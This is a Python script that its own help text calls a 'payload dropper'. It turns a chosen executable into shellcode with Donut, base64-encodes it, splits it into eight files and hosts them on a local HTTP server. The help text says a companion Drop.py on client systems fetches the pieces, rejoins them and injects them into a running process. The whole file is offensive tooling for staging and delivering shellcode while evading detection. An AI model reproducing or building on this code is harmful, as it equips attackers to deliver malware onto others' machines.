import base64
import sys
import random
import os
import ctypes
import time
from ctypes import *
from ctypes import wintypes
import donut
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import subprocess
import socket

verbose = True

def split(file_name):

    def generate_pad(pad):
        pad_num = random.randint(int(str(1) * pad), int(str(pad) * pad))
        return pad_num

    # file = sys.argv[1]
    # read_file = open(file_name, "rb")
    shellcode = donut.create(file_name, arch=2)
    content = base64.b64encode(shellcode)
    # read_file.close()
    divisions = 8
    size = int(len(content))
    pad = size % divisions
    if pad > 0:
        pad_content = generate_pad(pad)
        save_pad = open("pad.txt", 'w')
        save_pad.write(str(pad_content))
        save_pad.close()
    else:
        pad_content = None

    if verbose is True: print("Pad Length:", "Pad content: ", pad_content)
    divisible_content = content.decode('ascii') + str(pad_content)
    characters = int(len(divisible_content) / divisions)
    divided = []

    init = 0
    limit = characters
    for i in range(divisions):
        divided.append(divisible_content[init:limit])
        init += characters
        limit += characters

    # print(divisible_content)
    # print(divided)

    for i in range(len(divided)):
        write_file = open('file' + str(i), 'w')
        write_file.write(divided[i])
        write_file.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    IPAddr = s.getsockname()[0]

    host = subprocess.run("python -m http.server --bind " + str(IPAddr))
    print("Hosting: ", host)
    print("Hosting files on " + str(IPAddr) + ":8000 from " + os.getcwd())


if len(sys.argv) < 1:

    print("""
    
    A payload dropper, currently only for 64 bit ones that converts file to Shellcode with Donut,
    then encode it to b64, split the files into 8 parts and then hosts it in a server.
    Run the same file in client systems. That will recombine the files and inject it into current process.
    
    Usage:
    
    Split.py filename.ext -> Split files into 8 equal parts
    Drop.py ip.ip.ip.ip:port -> download split files and join them to execute
    
    """)

try:
    file_name = sys.argv[1]
    split(file_name)
except:
    file_name = False




